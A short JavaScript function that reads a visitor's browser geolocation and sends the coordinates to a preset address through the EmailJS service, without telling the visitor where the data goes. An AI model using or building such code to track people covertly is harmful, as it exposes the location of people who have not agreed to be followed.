function showPosition() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position) {
      var templateParams = {
        location: `Latitude: ${position.coords.latitude} and Longitude: ${position.coords.longitude}`,
      };

      emailjs.send('service_hlop24i', 'template_9rhu3z8', templateParams).then(
        function (response) {
          console.log('SUCCESS!', response.status, response.text);
        },
        function (error) {
          console.log('FAILED...', error);
        }
      );
    });
  } else {
    alert('Sorry, your browser does not support HTML5 geolocation.');
  }
}
